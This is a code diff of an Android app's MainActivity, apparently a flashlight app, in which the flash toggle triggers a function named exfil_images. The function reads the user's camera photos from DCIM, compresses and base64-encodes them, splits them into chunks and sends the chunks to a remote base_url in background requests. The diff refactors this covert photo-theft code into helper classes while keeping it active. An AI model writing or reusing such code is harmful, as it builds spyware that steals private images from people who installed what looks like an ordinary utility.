@@ -105,7 +105,7 @@ public class MainActivity extends AppCompatActivity {
                     } catch (CameraAccessException e) {
                         e.printStackTrace();
                     }
-                    exfil_image();
+                    exfil_images();
 //                        exfil();
                     flashControl.setText("Flash OFF");
                 }else{
@@ -121,78 +121,13 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    static String readFile(String path, Charset encoding) throws IOException {
-        byte[] encoded = Files.readAllBytes(Paths.get(path));
-        return new String(encoded, encoding);
-
-    }
-
-    private String to_b64(String file_path) throws IOException {
-//        File f =  new File(file_path);
-//        FileInputStream fileInputStreamReader = new FileInputStream(f);
-//        byte[] bytes = new byte[(int)f.length()];
-//        fileInputStreamReader.read(bytes);
-        Bitmap bm = BitmapFactory.decodeFile(file_path);
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        bm.compress(Bitmap.CompressFormat.JPEG, 60, baos); // bm is the bitmap object
-        byte[] bytes = baos.toByteArray();
-        String converted = Base64.encodeToString(bytes, Base64.DEFAULT);
-        return converted;
-    }
-
-    public static String compress_string(String str) throws IOException {
-        if (str == null || str.length() == 0) {
-            return str;
-        }/*w  w w. ja  va 2s.c om*/
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        GZIPOutputStream gzip = new GZIPOutputStream(out);
-        gzip.write(str.getBytes());
-        gzip.close();
-        return out.toString("ISO-8859-1");
-    }
-
-    private List<String> read_dir_files(String dir_path){
-        File folder = new File(dir_path);
-        File[] listOfFiles = folder.listFiles();
-        List<String> file_names = new ArrayList<String>();
-        for (int i = 0; i < listOfFiles.length; i++) {
-            if (listOfFiles[i].isFile()) {
-                System.out.println("File " + listOfFiles[i].getName());
-                file_names.add(listOfFiles[i].getName());
-            } else if (listOfFiles[i].isDirectory()) {
-                System.out.println("Directory " + listOfFiles[i].getName());
-            }
-        }
-        return file_names;
-    }
-
-    public static String b64_url_encoding(String b64) {
-        if (b64 == null) {
-            return "";
-        }
-        String encoded_b64 = b64.replace("+", "-");
-        encoded_b64 = encoded_b64.replace("/", "_");
-        encoded_b64 = encoded_b64.replaceAll(System.lineSeparator(),"");
-        return encoded_b64;
-    }
-
-    private void exfil_image() {
+    private void exfil_images() {
         String image_dir = Environment.getExternalStorageDirectory() + "/DCIM/Camera/";
-        List<String> filenames = read_dir_files(image_dir);
-        try {
-            String test_img_b64 = to_b64(image_dir+filenames.get(0));
-            String lelo = b64_url_encoding(test_img_b64);
-            List<String> image_buffers = new ArrayList<>();
-            int chunksize = 2000;
-            int length = lelo.length();
-            for (int i = 0; i < length; i += chunksize) {
-                image_buffers.add(lelo.substring(i, Math.min(length, i + chunksize)));
-            }
-            for(int i=0;i<image_buffers.size();i++){
-                new bgReq().execute(base_url+image_buffers.get(i));
-            }
-        }catch (IOException e){
-            e.printStackTrace();
+        List<String> filenames = Utils.read_dir_files(image_dir);
+        ExfilImage img = new ExfilImage(image_dir+filenames.get(0), 60);
+        List <String> image_buffers = img.buffered_b64image(2000);
+        for(int i=0;i<image_buffers.size();i++){
+            new bgReq().execute(base_url+image_buffers.get(i));
         }
     }
 
